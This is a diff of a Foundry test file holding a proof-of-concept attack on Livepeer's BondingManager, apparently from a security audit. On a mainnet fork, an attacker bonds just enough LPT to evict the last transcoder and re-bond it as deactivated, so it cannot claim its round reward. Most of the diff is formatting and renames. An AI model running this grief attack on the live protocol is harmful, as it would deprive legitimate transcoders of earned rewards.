@@ -1,15 +1,17 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.9;
 
-import {GovernorBaseTest} from "./base/GovernorBaseTest.sol";
+import { GovernorBaseTest } from "./base/GovernorBaseTest.sol";
 import "forge-std/console.sol";
 
 import "contracts/token/LivepeerToken.sol";
 
 interface IERC20 {
-    function transfer(address to, uint amount) external returns (bool);
-    function approve(address to, uint amount) external returns (bool);
-    function balanceOf(address to) external returns (uint);
+    function transfer(address to, uint256 amount) external returns (bool);
+
+    function approve(address to, uint256 amount) external returns (bool);
+
+    function balanceOf(address to) external returns (uint256);
 }
 
 interface IBondingManager {
@@ -45,50 +47,74 @@ interface IBondingManager {
     }
 
     function reward() external;
+
     function bond(uint256 _amount, address _to) external;
+
     function unbond(uint256 _amount) external;
+
     function transcoder(uint256 _rewardCut, uint256 _feeShare) external;
+
     function claimEarnings(uint256 _endRound) external;
 
     function getFirstTranscoderInPool() external view returns (address);
+
     function getNextTranscoderInPool(address _transcoder) external view returns (address);
-    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round) external view returns (TranscoderEarningsPoolData memory);
+
+    function getTranscoderEarningsPoolForRound(address _transcoder, uint256 _round)
+        external
+        view
+        returns (TranscoderEarningsPoolData memory);
+
     function getTranscoder(address _transcoder) external view returns (TranscoderData memory);
+
     function getDelegator(address _delegator) external view returns (DelegatorData memory);
 }
 
-interface IRoundManager {
-    function roundLength() external returns (uint);
+interface IRoundsManager {
+    function roundLength() external returns (uint256);
+
     function currentRound() external view returns (uint256);
+
     function initializeRound() external;
 }
 
-// forge test --match-contract BondingManagerGriefLastTranscoderRewardPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv --fork-block-number 290482185
+// forge test --match-contract BondingManagerGriefLastTranscoderRewardPoc --fork-url https://arbitrum-mainnet.infura.io/v3/$INFURA_KEY -vvv
 contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
-    LivepeerToken public constant lpt = LivepeerToken(0x289ba1701C2F088cf0faf8B3705246331cB8A839);
-    address minter = 0xc20DE37170B45774e6CD3d2304017fc962f27252;
+    LivepeerToken public immutable lpt;
+    address public immutable minter;
+    IBondingManager public immutable bondingManager;
+    IRoundsManager public immutable roundsManager;
 
-    IBondingManager bondingManager = IBondingManager(0x35Bcf3c30594191d53231E4FF333E8A770453e40);
-    IRoundManager roundManager = IRoundManager(0xdd6f56DcC28D3F5f27084381fE8Df634985cc39f);
+    constructor() {
+        lpt = LivepeerToken(getContract("LivepeerToken"));
+        minter = getContract("Minter");
+        bondingManager = IBondingManager(getContract("BondingManager"));
+        roundsManager = IRoundsManager(getContract("RoundsManager"));
+    }
 
-    uint roundLength;
+    uint256 roundLength;
 
     function setUp() public {
-        roundLength = roundManager.roundLength();
+        vm.rollFork(290482185);
+        roundLength = roundsManager.roundLength();
     }
 
     function _skipToNextRound() internal {
-        CHEATS.roll(block.number + roundLength);
-        roundManager.initializeRound();
+        vm.roll(block.number + roundLength);
+        roundsManager.initializeRound();
 
-        console.log("\n---------------------- ROUND = %s ----------------------", roundManager.currentRound());
+        console.log("\n---------------------- ROUND = %s ----------------------", roundsManager.currentRound());
     }
 
     function _getDelegatorData(address del) internal view returns (IBondingManager.DelegatorData memory) {
         return bondingManager.getDelegator(del);
     }
 
-    function _getTransoderEarningPoolData(address del, uint round) internal view returns (IBondingManager.TranscoderEarningsPoolData memory) {
+    function _getTransoderEarningPoolData(address del, uint256 round)
+        internal
+        view
+        returns (IBondingManager.TranscoderEarningsPoolData memory)
+    {
         return bondingManager.getTranscoderEarningsPoolForRound(del, round);
     }
 
@@ -98,33 +124,33 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
 
     function _getLastTranscoder() internal view returns (address lastTranscoder) {
         lastTranscoder = bondingManager.getFirstTranscoderInPool();
-        for (uint i = 1; i < 100; ++i) {
+        for (uint256 i = 1; i < 100; ++i) {
             lastTranscoder = bondingManager.getNextTranscoderInPool(lastTranscoder);
         }
     }
 
-    function test_poc() public {
+    function testPoc() public {
         address hacker = newAddr();
         address lastTranscoder = _getLastTranscoder();
 
         /// attacker need 450 + 2 lpt to execute the attack
-        CHEATS.prank(minter);
+        vm.prank(minter);
         lpt.mint(hacker, 450 * 1e18 + 2);
 
-        /// ---------------------- ROUND = 3639 ----------------------
+        /// ---------------------- ROUND = 45816 ----------------------
         _skipToNextRound();
 
         /// attacker bond for themself to make their status in the next round become "Bonded"
-        CHEATS.startPrank(hacker);
-        lpt.approve(address(bondingManager), type(uint).max);
+        vm.startPrank(hacker);
+        lpt.approve(address(bondingManager), type(uint256).max);
         bondingManager.bond(1, hacker);
-        CHEATS.stopPrank();
+        vm.stopPrank();
 
-        /// ---------------------- ROUND = 3640 ----------------------
+        /// ---------------------- ROUND = 45817 ----------------------
         _skipToNextRound();
 
         /// attacker bond more than the last transcoder and kick them out of the `transcoderPool`
-        CHEATS.startPrank(hacker);
+        vm.startPrank(hacker);
         bondingManager.bond(450 * 1e18, hacker);
         assertEq(hacker, _getLastTranscoder());
 
@@ -133,13 +159,13 @@ contract BondingManagerGriefLastTranscoderRewardPoc is GovernorBaseTest {
 
         /// the `lastTranscoder` is added into the `transcoderPool` again and become deactivated.
         bondingManager.bond(1, lastTranscoder);
-        CHEATS.stopPrank();
+        vm.stopPrank();
 
-        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundManager.currentRound() + 1);
+        assertEq(_getTranscoderData(lastTranscoder).activationRound, roundsManager.currentRound() + 1);
 
         /// the `lastTranscoder` is unable to claim the reward for ROUND = 3640 because it's considered as inactivate
-        // CHEATS.expectRevert(bytes("caller must be an active transcoder"));
-        CHEATS.prank(lastTranscoder);
+        vm.expectRevert(bytes("caller must be an active transcoder"));
+        vm.prank(lastTranscoder);
         bondingManager.reward();
         console.log(_getTranscoderData(lastTranscoder).deactivationRound);
 
